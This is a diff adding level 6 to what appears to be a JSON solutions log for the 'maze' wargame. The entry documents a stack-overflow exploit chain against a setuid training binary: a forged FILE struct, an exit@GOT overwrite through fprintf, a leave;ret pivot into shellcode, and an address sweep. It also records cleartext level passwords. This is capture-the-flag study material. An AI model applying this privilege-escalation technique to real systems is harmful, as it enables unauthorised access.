@@ -210,6 +210,60 @@
     }
    ],
    "note": "maze5 asks for an 8-char username + 8-char key (%8s), checks ptrace(TRACEME) (anti-debug: under strace it prints 'nahnah...'), and runs foo(user,key): foo XORs nothing \u2014 it computes dec[i] = 'printlol'[i] - (2*i + user[i] - 'A') byte-wise and reverse-scans dec[i]==key[i]; the reverse loop returns 1 only when the index wraps to -1. The key is therefore key[i] = 'printlol'[i] - 2i - (user[i]-'A') mod 256. With user 'AAAAAAAA' (c=0): key 'ppehlbc^'. The spawned shell needs a tty (piped stdin is ignored \u2014 it stalls), so run it over ssh -tt. setreuid(euid,euid) fixes BOTH uids to maze6 (id shows uid=15006 gid=15005). Password dXEKrdYgQR verified by ssh login as maze6 (uid=15006, cat matches). Recording: recordings/maze/L5.cast. Files: tools/maze/l5/ (maze5 copy, solve.py derivation, NOTES.md)."
+  },
+  {
+   "lvl": 6,
+   "pw": "ckkOx2s4Ev",
+   "user": "maze7",
+   "steps": [
+    {
+     "cmd": "ls -la /maze/maze6; md5sum /maze/maze6",
+     "out": [
+      "-r-sr-x--- 1 maze7 maze6 14352 Oct 25 13:39 /maze/maze6",
+      "a3dde0a162510d0c142a6d33f66084d0  /maze/maze6"
+     ]
+    },
+    {
+     "cmd": "objdump -d -M intel /maze/maze6 (main 0x80491d6)",
+     "out": [
+      "argc==3; fopen(argv[1], \"a\"); strcpy(buf[0x100 @ ebp-0x104], argv[2])  <- unbounded",
+      "memfrob(buf, strlen(buf))   (XOR 42, involution)",
+      "fprintf(f, \"%s : %s\\n\", argv[1], buf); exit(0)   <- saved EIP never used"
+     ]
+    },
+    {
+     "cmd": "readelf -l /maze/maze6 | grep GNU_STACK; objdump -R /maze/maze6 | grep exit",
+     "out": [
+      "GNU_STACK RWE (ASLR off) -> stack shellcode executable",
+      "exit@GOT = 0x0804b228 (no RELRO, but only the stack is reachable)"
+     ]
+    },
+    {
+     "cmd": "python3 sc.py > sc.bin   (71 bytes, NUL-free, no 0x2a)",
+     "out": [
+      "open('/etc/maze_pass/maze7'); read 15; write(1); exit"
+     ]
+    },
+    {
+     "cmd": "exploit.py build(0xffffd7e4...): payload = 0x2a0 + 71 = 743 bytes",
+     "out": [
+      "buf[0..4] = leave;ret (libc+0x1af32e)  -> lands on exit@GOT via the fprintf line",
+      "buf+0x100 = fake FILE (0xa0-byte copy of the real heap FILE, vtable@0x94 intact,",
+      "  write_base/ptr = exit@GOT-24)  -> fprintf memcpy's the line into the GOT",
+      "buf+0x104 saved ebx, +0x108 -> shellcode, +0x10c argc=3, +0x110 argv ptr,",
+      "  +0x1d0 argv[0..2]+NULL repaired, +0x284 the path string (payload-internal),",
+      "  +0x2a0 the shellcode"
+     ]
+    },
+    {
+     "cmd": "fire.py: sweep buf = 0xffffd7e4 + [-0x1000..0x1000] step 4, run /maze/maze6",
+     "out": [
+      "HIT buf 0xffffcfb4",
+      "ckkOx2s4Ev"
+     ]
+    }
+   ],
+   "note": "maze6 has an unbounded strcpy(buf[0x100], argv[2]) with no canary; memfrob (XOR 42) is an involution so argv[2] = payload^42 and buf arrives INTACT at fprintf (raw NULs ride in argv[2] as 0x2a). main ends with exit(0) so the saved EIP is dead: the chain is (1) repair the smashed caller frame (argc/argv/envp + the argv[] array at buf+0x1d0) with argv[1] pointing at a path string COPIED INTO the payload (env-independent line length), (2) replace the FILE* f (buf+0x100) with a byte-exact 0xa0-byte copy of the real heap FILE struct (vtable at +0x94 INTACT - an 0x8c-byte copy misses it and glibc aborts with 'invalid stdio handle') with write_base/ptr = exit@GOT-24, so fprintf memcpy's the line into the GOT landing buf[0..4] = leave;ret exactly on exit@GOT, (3) after fprintf, call exit@plt -> jmp *GOT runs leave;ret: esp := ebp (our buf+0x104), ret -> [buf+0x108] = the pass-reading shellcode (open/read/write /etc/maze_pass/maze7 to fd 1; no execve - dash drops the euid). buf swept: HIT at 0xffffcfb4 in the pty env (0xffffd7e4 in the sweep env - the stack address is env-dependent, hence the sweep). Password ckkOx2s4Ev verified by ssh login as maze7 (uid=15007). Recording: recordings/maze/L6.cast. Files: tools/maze/l6/ (maze6 copy, exploit.py, sc.py, fastsweep.py, NOTES.md)."
   }
  ],
  "goals": {
